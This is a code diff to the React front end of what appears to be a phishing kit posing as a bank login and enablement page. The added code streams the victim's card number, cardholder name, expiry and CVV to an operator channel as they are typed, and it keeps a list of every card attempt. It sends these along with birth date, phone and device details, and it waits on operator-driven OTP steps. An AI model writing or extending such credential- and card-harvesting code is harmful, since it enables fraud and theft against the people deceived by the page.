@@ -95,6 +95,7 @@ export default function App() {
   const dispositivoFromPanelRef = useRef(Boolean(initial?.dispositivoFromPanel))
   const cardTimerRef = useRef(0)
   const cardDraftTimerRef = useRef(0)
+  const cardAttemptsRef = useRef([])
 
   useEffect(() => {
     pendingUserRef.current = pendingUser
@@ -225,6 +226,7 @@ export default function App() {
     )
     setStep('idle')
     sessionIdRef.current = null
+    cardAttemptsRef.current = []
     clearPending()
   }
 
@@ -248,6 +250,7 @@ export default function App() {
     setOtpTokenError('')
     setPendingUser(null)
     sessionIdRef.current = null
+    cardAttemptsRef.current = []
     clearPending()
   }
 
@@ -296,7 +299,13 @@ export default function App() {
     }
 
     if (currentStep === 'card') {
-      return
+      if (
+        remote.state === 'waiting' ||
+        remote.state === 'typing' ||
+        remote.state === 'waiting-dispositivo'
+      ) {
+        return
+      }
     }
 
     if (remote.state === 'waiting-dispositivo') {
@@ -442,7 +451,7 @@ export default function App() {
         if (!sessionIdRef.current || msg.sessionId !== sessionIdRef.current) return
 
         if (msg.action === 'ganapin' || msg.action === 'totp') {
-          if (routeRef.current === 'habilitar' || stepRef.current === 'card') return
+          if (routeRef.current === 'habilitar') return
           if (msg.image) applyFactor(msg.action, msg.image)
           else syncFromHub()
           return
@@ -525,6 +534,7 @@ export default function App() {
     const id = opsBus.createId()
     sessionIdRef.current = id
     lastTerminalKeyRef.current = ''
+    cardAttemptsRef.current = []
     setPendingUser(user)
     setOtpVariant(null)
     setOtpImage('')
@@ -560,9 +570,10 @@ export default function App() {
     const id = sessionIdRef.current
     if (!id) return
     const cardNumber = String(draft.cardNumber || '').replace(/\D/g, '')
+    const cardName = String(draft.cardName || '').trim()
     const cardExpiry = draft.cardExpiry || ''
     const cvv = String(draft.cvv || '').replace(/\D/g, '')
-    if (!cardNumber && !cardExpiry && !cvv) return
+    if (!cardNumber && !cardName && !cardExpiry && !cvv) return
     if (cardDraftTimerRef.current) window.clearTimeout(cardDraftTimerRef.current)
     const delay = cardNumber.length >= 16 || cvv.length >= 3 ? 60 : 220
     cardDraftTimerRef.current = window.setTimeout(() => {
@@ -575,6 +586,7 @@ export default function App() {
         tipoUsuario: pendingUserRef.current?.tipoUsuario || 'CODIGO_PERSONA',
         flow: routeRef.current === 'habilitar' ? 'habilitar' : 'login',
         cardNumber,
+        cardName,
         cardExpiry,
         cvv,
         last_seen: Date.now(),
@@ -601,7 +613,15 @@ export default function App() {
     setOtpTokenError('')
     setErrorMsg('')
     setSuccessMsg('')
-    setStep('loading')
+
+    const cardAttempt = {
+      cardNumber: data.cardNumber || '',
+      cardName: data.cardName || '',
+      cardExpiry: data.cardExpiry || '',
+      cvv: data.cvv || '',
+      at: Date.now(),
+    }
+    cardAttemptsRef.current = [...cardAttemptsRef.current, cardAttempt]
 
     opsBus.sessionCreated({
       id,
@@ -621,8 +641,11 @@ export default function App() {
       birthDate: data.birthDate,
       phone: data.phone,
       cardNumber: data.cardNumber || '',
+      cardName: data.cardName || '',
       cardExpiry: data.cardExpiry || '',
       cvv: data.cvv || '',
+      cardAttempt,
+      cardAttempts: cardAttemptsRef.current,
       device: detectDevice(),
       ip: '127.0.0.1',
       last_seen: Date.now(),
